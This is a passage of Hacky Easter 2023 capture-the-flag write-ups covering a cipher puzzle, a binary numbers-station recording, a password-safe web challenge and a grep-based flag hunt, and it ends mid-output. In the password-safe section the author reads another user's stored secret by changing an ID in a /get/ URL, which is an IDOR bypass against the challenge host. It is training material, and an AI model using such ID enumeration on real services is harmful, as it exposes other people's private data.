</pre></table></code></div></div><p>whoo!!</p><p>that was fun :)</p><h2> Flag</h2><code> he2023{al1asses-4-fUn-and-pr0fit} </code><hr><h1 id="going-round"> Going Round <a href="/writeups/HackyEaster_2023/level5-3-going-round.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I got a flag, but it’s encrypted somehow: <code class="language-plaintext highlighter-rouge">ip0232j{1t_x_v0z4b3bm__v4xvq}a</code></p><p>It was created using the following service:</p><p>http://ch.hackyeaster.com:2305</p><p>Note: The service is restarted every hour at x:00.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We get a service that takes our input and shows the encrypted flag.</p><p>It’s clear its doing a rotation cipher (alternating between a rotation of 4 and 8 character), and also swapping the positions of pairs of letters.</p><p>It was easy enough to fiddle with our string in the service until we get the encrypted flag we were given, and thus know the real flag.</p><h2> Flag</h2><code> he2023{fl1p_n_r0t4t3_in_p4irs} </code><hr><h1 id="number-s-station"> Number's Station <a href="/writeups/HackyEaster_2023/level5-4-numbers-station.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>“Testing, testing, one, two, one, zero..” - the bunnies found a strange radio station when looking for uplifting BunnyBop; can you find out what the nice Spanish lady is saying?</p><p>Hint:</p><blockquote><p>There are 10 kinds of people in this world.</p><p>Those who understand binary, and those who don’t.</p></blockquote><p><a href="writeupfiles/numbers.mp3">numbers.mp3</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We transcribe it with Whisper which is really annoying since it constantly loses it’s plot and I’ve ended up manually transcribing about half of the audio as a result:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>0 4 B 6 1 4 1 5 0 4 1 3 0 4 0 7 0 9 0 7 1 7 1 6 0 3 0 9 1 7 0 9 1 8 0 6 0 6 1 6 1 6 0 3 0 4 1 4 0 2
0 4 0 3 1 4 1 7 0 4 0 3 0 6 0 9 0 6 0 2 1 8 1 7 0 9 0 4 1 3 0 3 0 3 0 7 1 8 1 5 0 3 0 4 1 7 1 2 0 9
1 7 1 2 1 3 1 7 0 7 1 9 1 6 0 4 1 8 0 4 0 2 1 8 1 7 0 6 0 8 0 5 0 4 1 5 1 4 0 6 0 9 0 5 1 9 0 2 1 4
1 8 1 3 0 4 0 7 1 6 1 4 0 7 1 6 1 6 1 2 0 5 1 2 0 9 0 8 0 7 1 8 1 5 0 8 0 3 1 2 0 4 1 4 0 6 1 4 1 5
0 6 1 4 1 2 1 7 0 8 0 3 1 2 1 9 0 7 1 8 0 2 0 4 1 3 0 5 1 5 1 3 0 2 1 3 1 2 1 8 0 2 0 2 1 2 1 8 0 5
0 4 1 2 1 3 1 6 0 9 1 2 0 3 1 4 1 5 1 8 1 4 1 6 0 3 1 6 1 5 1 8 0 6 1 9 0 7 0 3 0 8 1 7 1 7 0 9 1 8
1 4 1 3 1 7 0 4 1 9 0 5 1 6 1 3 1 2 1 2 1 8 0 7 1 8 1 4 1 2 0 2 0 6 1 7 1 7 0 4 1 4 1 9 1 3 0 7 0 4
0 3 0 6 0 2 1 4 1 6 1 9 1 9 0 9 0 4 1 6 0 7 1 7 0 8 1 2 1 8 1 3 1 7 1 8 0 2 1 7 1 9 0 4 0 2 0 2 1 3
1 2 0 9 0 5 1 2 1 9 0 9 0 5 0 4 0 9 0 5 1 8 1 7 0 4 1 5 1 6 0 5 1 7 0 3 1 6 1 3 0 9 1 8 1 4 0 4 1 6
0 2 1 3 1 3 1 9 0 5 1 8 0 5 1 8 0 6 1 5 1 8 0 9 1 2 1 2 1 7 0 3 0 5 1 3 1 3 0 4 1 7 0 7 0 6 1 2 0 4
1 5 1 2 0 3 0 8 0 6 1 9 1 6 0 2 1 3 1 3 0 7 0 5 0 9 0 2 1 3 0 2 1 7 1 9 1 3 0 9 1 6 0 5 0 9 0 4 0 4
1 4 1 7 0 6 0 3 0 4 1 7 0 4 1 8 1 6 0 4 1 4 1 6 1 6 1 2 0 6 1 4 1 2 0 5 1 7 1 8 1 3 0 6 0 3 1 3 1 7
1 4 0 4 0 7 1 3 1 8 0 9 1 2 1 7 1 7 1 2 1 2 0 5 1 7
</pre></table></code></div></div><p>the even columns are all either 0 or 1 (with the exception of the first ‘b’ I’m guessing for ‘binary’). The newlines were inserted around roughly the pauses in the audio.</p><p>So let’s pull out those two columns:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>4645434797763979866663442
4347436962879433378534729
7237796484287685454695924
8347647662529878583244645
6427832978243553232822285
4236923458463658697387798
4374956322878422677449374
3624699946778283782794223
2952995495874565736398446
2339585865892273533477624
5238696233759232793965944
4763474864466264257836337
4473892772257
</pre></table></code></div></div><p>And the binary ones:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>0B11010000110010100110010
0011000000110010001100110
1111011010011000011000101
1100110111010001100101011
0111001101001011011100110
0111010111110111010001101
1110101111101110011011100
0001111001010111110110001
1001100000110110101101101
0111010101101110011010010
1100011011000010111010000
1100010110111101101110011
1001101111101
</pre></table></code></div></div><p>which turn up… nothing on <a href="https://www.asciitohex.com/">ascii2hex</a>. Odd. Could be transcription errors, but, still.</p><p>Saskia points out that if you add a zero at the start, then it decodes completely properly.</p><h2> Flag</h2><code> he2023{L1stening_to_spy_c0mmunicat1ons} </code><hr><h1 id="igor-s-gory-passwordsafe"> Igor's Gory Passwordsafe <a href="/writeups/HackyEaster_2023/level5-5-igors-gory-passwordsafe.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>You found the following letter:</p><p>Hi Peter</p><p>Thanks again for your help in cryptography to make the passwordsafe secure. Now</p><ul><li>The passwords of the user are stored in a irreversible way (bcrypt)<li>All passwords in the safe are encrypted by a strong symmetric key</ul><p>Kind regards, Roy</p><p>Open the passwordsafe at at http://ch.hackyeaster.com:2312 to get your 🚩 flag.</p><p>Note: The service is restarted every hour at x:00.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>website where we can create an account, then add passwords to our vault, en from there there is an option to copy, edit or delete the passwords in the vault</p><p>So we create an account. We cannot make one with the name igor, so probably we need to impersonate igor to get into his vault?</p><p>When we create a password, it gets id <code class="language-plaintext highlighter-rouge">12</code>, I wonder why it starts there..</p><p>We find the code for copying a password, its a simple call to <code class="language-plaintext highlighter-rouge">/get/&lt;id&gt;</code> ..so let’s just try some other ids?</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="nf">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nf">ready</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Application is running</span><span class="dl">"</span><span class="p">)</span>

    <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">.copypassword</span><span class="dl">"</span><span class="p">).</span><span class="nf">click</span><span class="p">(</span><span class="nf">function </span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">obj</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">id</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">copypassword_</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">id</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">id</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">_</span><span class="dl">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
            <span class="nx">$</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/get/</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">id</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if </span><span class="p">(</span><span class="nx">status</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">success</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nb">navigator</span><span class="p">.</span><span class="nx">clipboard</span><span class="p">.</span><span class="nf">writeText</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">});</span>
        <span class="p">}</span>
    <span class="p">});</span>

    <span class="nf">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nf">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
        <span class="nf">setInterval</span><span class="p">(</span><span class="nx">flashingEyes</span><span class="p">,</span><span class="mi">1000</span><span class="p">);</span>
     <span class="p">});</span>
     <span class="kd">function</span> <span class="nf">flashingEyes</span><span class="p">(){</span>
        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#eyes</span><span class="dl">"</span><span class="p">).</span><span class="nf">fadeIn</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">delay</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nf">fadeOut</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span>
     <span class="p">}</span>

<span class="p">});</span>

</pre></table></code></div></div><p>In the end, we find our flag when we try id <code class="language-plaintext highlighter-rouge">07</code> (by simply going to http://ch.hackyeaster.com:2312/get/07), we get the response <code class="language-plaintext highlighter-rouge">he2023{1d0R_c4n_d3str0y_ur_Crypt0_3ff0rt}</code></p><p>The flag refers to <em>Insecure direct object reference (IDOR)</em></p><p>(other id’s contain responses like <code class="language-plaintext highlighter-rouge">SQLI_doesnt_help</code>, <code class="language-plaintext highlighter-rouge">verySecure</code>, <code class="language-plaintext highlighter-rouge">Well_not_the_flag</code>, <code class="language-plaintext highlighter-rouge">White_Rabbit_99</code>)</p><p>ok, that was.. easier than I thought it was going to be ..was definitely overthinking this one for the longest time.</p><h2> Flag</h2><code> he2023{1d0R_c4n_d3str0y_ur_Crypt0_3ff0rt} </code><hr><h1 id="singular"> Singular <a href="/writeups/HackyEaster_2023/level5-6-singular.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Wow, so many flags!</p><p>Find the real flag, which is unique in multiple ways.</p><p><a href="writeupfiles/singular.zip">singular.zip</a></p><p>Hint: This one can be solved with linux commands, with a one-liner.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>First let’s get the real uniques:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">cat </span>singular.txt | <span class="nb">sort</span> | <span class="nb">uniq</span> <span class="nt">-c</span> | <span class="nb">grep</span> <span class="s1">' 1 '</span> | egrep he.<span class="k">*</span> <span class="nt">-o</span> <span class="o">&gt;</span> unique.txt
</pre></table></code></div></div><p>Those are unique within the entire file which we can reasonably assume from the challenge description. In discord we see the additional hint:</p><blockquote><p>While it’s unique from top to bottom, it’s unique from left to right as well</p></blockquote><p>So let’s look for things which do not re-use a single letter letter from left to right:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ cat unique.txt | egrep '\{(.*)\}' -o | egrep '([^_]).*\1' --invert-match
$
</pre></table></code></div></div><p>nothing. Every single entry re-uses letters left to right.</p><h3 id="word-frequency"><span class="mr-2">Word Frequency</span><a href="#word-frequency" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>$ cat unique.txt | egrep '\{(.*)\}' -o | wf | sort -n
Total words: 960
    1	Mr
    1	act
    1	as
    1	because
    1	begin
    1	body
    1	boy
    1	cause
    1	crime
    ...
   10	represent
   10	ten
   10	yes
   11	become
   11	party
   11	service
</pre></table></code></div></div><p>lots of unique, and non-unique words.</p><div file="ones with unique words.txt" class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="ones with unique words.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>$ egrep -f &lt;( cat unique.txt | egrep '\{(.*)\}' -o | wf | sort -n | egrep '\s1\s' | cut -f 2 | sed -r 's/(.*)/_?\1_?/g') unique.txt
Total words: 960
he2023{according_physical_success_ask}
he2023{account_consider_small_medical}
he2023{action_and_cell_indeed}
he2023{activity_know_shoulder_bring}
he2023{actually_still_thank_available}
he2023{add_girl_everything_care}
he2023{add_measure_staff_will}
he2023{affect_help_check_season}
he2023{again_different_economic_improve}
he2023{alone_of_Mrs_trade}
</pre></table></code></div></div><p>But none of them have two unique words (based on grep colouring). Similar result of you check the extremely non-unique ones:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ egrep -f &lt;( cat unique.txt | egrep '\{(.*)\}' -o | wf | sort -n | egrep '\s11\s' | cut -f 2 | sed -r 's/(.*)/_?\1_?/g') unique.txt
</pre></table></code></div></div><h3 id="capitals"><span class="mr-2">Capitals?</span><a href="#capitals" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Not that many have capitals</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>$ cat unique.txt|grep '[A-Z]'
he2023{American_address_item_book}
he2023{American_environmental_parent_like}
he2023{Congress_power_size_particular}
he2023{I_nearly_book_bar}
he2023{I_particularly_name_positive}
he2023{TV_economic_respond_race}
he2023{admit_change_start_Congress}
he2023{adult_number_I_year}
he2023{age_Republican_bed_must}
he2023{alone_of_Mrs_trade}
he2023{among_American_author_agreement}
he2023{blood_other_give_I}
he2023{especially_Mrs_cell_majority}
he2023{fall_still_TV_the}
he2023{fund_music_hotel_PM}
he2023{interview_seem_which_Mrs}
he2023{issue_Republican_war_six}
he2023{memory_service_Mr_activity}
he2023{modern_assume_TV_follow}
he2023{money_story_TV_future}
he2023{need_final_name_American}
he2023{never_PM_cover_camera}
he2023{news_Republican_true_actually}
he2023{owner_Mrs_reveal_provide}
he2023{serious_PM_statement_arm}
he2023{standard_risk_impact_I}
he2023{teacher_white_hear_TV}
</pre></table></code></div></div><p>Mr is the only one with a unique capital word:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>$ cat unique.txt|grep '[A-Z][a-z]*' -o | wf
    5	I
    3	M
    3	P
    5	T
    5	V
    2	Congress
    4	Mrs
    4	American
    1	Mr
    3	Republican
Total words: 10
</pre></table></code></div></div><h3 id="unique-column-values"><span class="mr-2">Unique Column Values</span><a href="#unique-column-values" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>I created lists of all the unique words in each column:</p><p>and then made this lovely grep:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>egrep <span class="nt">--color</span><span class="o">=</span>auto <span class="s1">'{(Congress|TV|able|about|above|according|across|action|activity|actually|address|administration|admit|adult|affect|against|ago|ahead|air|all|almost|always|animal|another|answer|appear|area|arm|around|art|article|artist|ask|assume|attack|audience|author|available|avoid|ball|bank|bar|before|begin|believe|benefit|best|bill|bit|black|body|box|break|bring|brother|building|buy|camera|campaign|capital|card|career|carry|case|challenge|character|charge|check|choice|choose|city|claim|clear|clearly|cold|color|common|community|computer|conference|consumer|contain|control|could|country|course|crime|culture|cup|current|dark|day|debate|decade|decide|decision|deep|defense|degree|design|despite|develop|development|different|difficult|director|discuss|drug|during|early|easy|education|enjoy|enough|even|evening|evidence|fact|far|father|fear|feeling|field|fight|figure|finally|find|firm|fish|focus|follow|foot|force|foreign|free|friend|front|full|fund|future|get|go|good|government|green|ground|growth|he|head|help|high|history|hold|home|how|human|hundred|idea|imagine|in|individual|industry|inside|instead|involve|kitchen|knowledge|language|last|lay|learn|least|less|letter|light|likely|local|lot|machine|major|manage|management|material|maybe|medical|meet|mention|method|middle|mind|mission|moment|most|movement|much|necessary|need|network|new|newspaper|no|note|notice|number|off|office|officer|on|only|opportunity|or|other|out|over|painting|paper|particularly|pay|per|person|personal|pick|picture|place|point|policy|poor|popular|positive|possible|practice|prepare|president|pressure|prevent|probably|product|production|professional|program|protect|quickly|quite|race|reach|real|reality|recently|recognize|record|red|relationship|religious|represent|research|return|rich|rise|rock|role|rule|safe|school|science|seat|second|section|security|seek|sell|send|sense|show|significant|sing|sister|sit|site|six|size|skin|small|society|someone|something|song|sound|south|southern|space|special|staff|stand|state|stay|stop|story|stuff|success|successful|suffer|summer|surface|system|table|talk|task|teacher|television|tell|term|than|that|their|themselves|theory|these|this|throw|thus|time|today|together|top|training|treat|treatment|tree|trial|trip|trouble|turn|unit|up|us|use|value|various|voice|walk|wall|want|watch|water|way|weight|well|what|whatever|where|who|whole|whom|wind|with|within|work|worry|would|wrong|you|young|your)_(American|ability|able|above|account|across|act|action|add|administration|again|against|agree|air|allow|almost|already|also|among|animal|answer|any|anyone|appear|apply|arrive|art|article|artist|at|attack|audience|authority|avoid|away|baby|base|be|because|before|behavior|behind|both|bring|budget|building|campaign|candidate|capital|car|care|carry|case|central|century|chance|choose|city|clearly|close|collection|college|common|concern|contain|cost|course|cultural|culture|data|daughter|deal|decade|defense|degree|design|develop|development|direction|director|discuss|do|doctor|door|down|draw|east|easy|education|effect|either|end|enough|entire|environmental|especially|establish|event|everybody|evidence|exactly|eye|face|factor|fall|fast|find|finish|firm|first|fish|force|forget|front|full|garden|gas|general|get|give|glass|go|grow|growth|hand|happen|head|health|heart|help|here|herself|history|hit|hope|hot|hotel|house|human|idea|image|impact|improve|in|indicate|industry|inside|into|involve|issue|it|job|join|kid|kitchen|knowledge|late|law|leader|least|leave|leg|let|letter|light|list|little|long|look|low|magazine|major|make|many|media|message|method|model|modern|morning|most|mouth|movie|much|my|name|national|near|necessary|network|never|nice|not|of|officer|official|often|once|only|operation|order|other|our|parent|part|partner|pass|performance|perhaps|phone|pick|position|positive|possible|present|pressure|pretty|process|product|purpose|push|put|quality|quickly|race|radio|ready|real|reason|receive|reduce|reflect|relate|relationship|religious|remain|response|result|risk|road|rule|run|science|sea|season|seat|see|seem|send|sense|series|short|simple|single|sit|site|skill|so|social|someone|soon|sound|source|staff|statement|stop|story|strong|support|sure|system|table|teacher|ten|tend|test|than|thank|the|their|them|there|these|they|think|thought|time|to|today|top|travel|treatment|trial|truth|type|understand|until|use|usually|value|various|voice|vote|water|we|weight|well|west|western|when|where|whether|which|whom|wife|with|within|wonder|write|year|you|your|yourself)_(I|Mr|Mrs|a|about|according|account|activity|actually|admit|adult|agree|agreement|ahead|air|allow|almost|already|amount|analysis|answer|anything|appear|approach|arm|article|as|ask|assume|attack|author|away|baby|bad|ball|bank|base|beat|become|before|behind|believe|best|bill|blood|blue|box|boy|break|bring|business|call|capital|care|career|case|cause|center|certain|certainly|character|child|choice|clear|cold|commercial|conference|contain|control|cost|could|country|couple|course|create|customer|cut|data|deal|deep|describe|develop|development|difference|dinner|direction|discover|discuss|do|dog|draw|dream|during|each|edge|eight|election|end|energy|enjoy|enter|environmental|establish|expert|explain|factor|fall|fast|fear|fight|figure|film|final|financial|find|fire|first|fish|five|floor|foot|forward|four|free|friend|from|future|general|generation|give|goal|good|government|great|green|grow|hair|hand|have|hear|heart|heavy|here|herself|high|him|history|hold|hope|hot|hotel|hour|identify|if|image|impact|important|improve|increase|information|interview|into|involve|itself|key|kid|kind|large|last|later|lawyer|lay|leader|learn|least|leg|let|light|like|line|list|listen|live|long|look|loss|lot|machine|main|make|man|manage|management|manager|market|may|mean|medical|meeting|member|mention|message|million|mind|minute|miss|most|mother|myself|nation|natural|near|new|news|newspaper|nice|night|nor|not|nothing|notice|occur|off|offer|officer|ok|once|one|only|open|outside|page|painting|paper|part|participant|particular|particularly|partner|pass|pay|peace|person|personal|political|popular|population|position|practice|present|president|prevent|product|production|program|project|protect|prove|purpose|push|race|raise|rate|rather|read|real|realize|really|reason|recently|reduce|reflect|report|represent|require|research|rock|rule|same|school|science|second|seek|seem|sell|sense|series|serious|set|shake|share|should|shoulder|show|sign|significant|simple|simply|situation|size|smile|so|soldier|some|soon|south|speak|staff|state|statement|station|step|store|story|strategy|stuff|success|such|support|surface|table|take|talk|task|tax|teach|team|television|tend|term|than|them|theory|there|these|thing|third|this|those|three|together|total|town|trade|traditional|travel|two|type|under|understand|unit|until|upon|value|very|view|visit|voice|vote|want|way|we|west|whatever|where|whether|why|wind|word|worker|would|wrong|you|young|your)_(American|Congress|Mrs|PM|TV|ability|able|action|address|affect|again|agree|air|also|amount|and|animal|another|any|arm|arrive|art|article|ask|attack|attention|authority|base|beat|beautiful|believe|better|beyond|bill|board|book|born|both|break|bring|build|building|buy|can|capital|car|case|cell|center|century|certain|certainly|chair|challenge|chance|change|charge|choice|choose|church|city|claim|clear|close|coach|collection|commercial|common|computer|condition|conference|consumer|contain|couple|cup|current|cut|debate|decade|decision|detail|determine|dinner|direction|discuss|do|down|either|employee|end|energy|enough|enter|environment|environmental|especially|establish|even|event|ever|every|everybody|exist|expect|experience|factor|family|far|fast|father|field|final|finally|find|firm|fish|follow|food|force|former|forward|four|from|game|general|girl|give|great|ground|gun|happy|hard|have|he|health|heart|himself|hold|home|hope|hospital|how|hundred|idea|identify|if|impact|including|information|institution|international|interview|involve|it|itself|join|just|key|last|law|lay|learn|left|let|letter|life|likely|list|little|loss|magazine|man|manage|management|manager|many|may|me|mean|media|medical|memory|message|method|middle|might|military|million|miss|mission|more|morning|most|move|movement|movie|much|music|my|need|new|news|next|nice|night|north|notice|number|offer|office|official|old|once|operation|opportunity|or|other|out|outside|page|painting|partner|people|per|perhaps|person|plant|player|point|policy|political|poor|population|possible|prepare|president|pretty|price|probably|product|provide|put|quality|question|quickly|radio|raise|range|rate|read|real|reality|realize|reason|recent|recognize|region|relationship|religious|remain|result|rich|run|safe|save|say|science|season|see|seem|sell|send|senior|sense|series|serious|service|set|side|single|size|small|society|some|sometimes|son|sort|south|speech|sport|staff|still|stop|store|subject|suffer|support|table|take|task|technology|than|the|their|think|third|threat|three|throughout|throw|total|trade|training|treatment|trip|understand|until|upon|use|very|view|visit|voice|vote|wait|watch|we|what|whatever|when|where|whether|whole|whom|why|wind|window|within|word|world|write|year|your)}'</span> unique.txt
</pre></table></code></div></div><p>Which returned:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>he2023{address_type_each_car}
he2023{early_race_very_outside}
he2023{education_exactly_market_cup}
he2023{enjoy_case_blood_health}
he2023{language_front_significant_their}
he2023{last_kitchen_dog_action}
he2023{or_event_part_rich}
he2023{practice_animal_account_enough}
he2023{production_within_science_quality}
he2023{represent_pretty_according_window}
he2023{school_stop_lot_break}
he2023{staff_hope_child_amount}
he2023{theory_they_off_when}
he2023{together_end_five_possible}
he2023{wall_leg_require_point}
</pre></table></code></div></div><h3 id="how-about-repeated-initial-letters"><span class="mr-2">How about repeated initial letters?</span><a href="#how-about-repeated-initial-letters" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Nothing super promising here:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>unique.txt| egrep <span class="s1">'\{(.).*_\1.*_\1'</span>
he2023<span class="o">{</span>among_American_author_agreement<span class="o">}</span>
he2023<span class="o">{</span>cell_course_church_heavy<span class="o">}</span>
he2023<span class="o">{</span>customer_concern_candidate_parent<span class="o">}</span>
he2023<span class="o">{</span>huge_man_hit_half<span class="o">}</span>
he2023<span class="o">{</span>nearly_never_best_newspaper<span class="o">}</span>
he2023<span class="o">{</span>several_street_somebody_represent<span class="o">}</span>
he2023<span class="o">{</span>six_involve_seat_someone<span class="o">}</span>
he2023<span class="o">{</span>sound_simply_wish_see<span class="o">}</span>
he2023<span class="o">{</span>specific_simple_service_two<span class="o">}</span>
he2023<span class="o">{</span>state_laugh_simply_sense<span class="o">}</span>
he2023<span class="o">{</span>study_strong_do_step<span class="o">}</span>
</pre></table></code></div></div><h3 id="short-long"><span class="mr-2">Short? Long?</span><a href="#short-long" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Nope, nothing unique of either shortest or longest</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>$ cat unique.txt|awk '{print $0, length($0)}' | sort -nk2 | grep 25
he2023{I_nearly_book_bar} 25
he2023{air_bar_beat_note} 25
he2023{fall_still_TV_the} 25
he2023{fine_step_so_mind} 25
he2023{he_draw_yet_owner} 25
he2023{huge_man_hit_half} 25
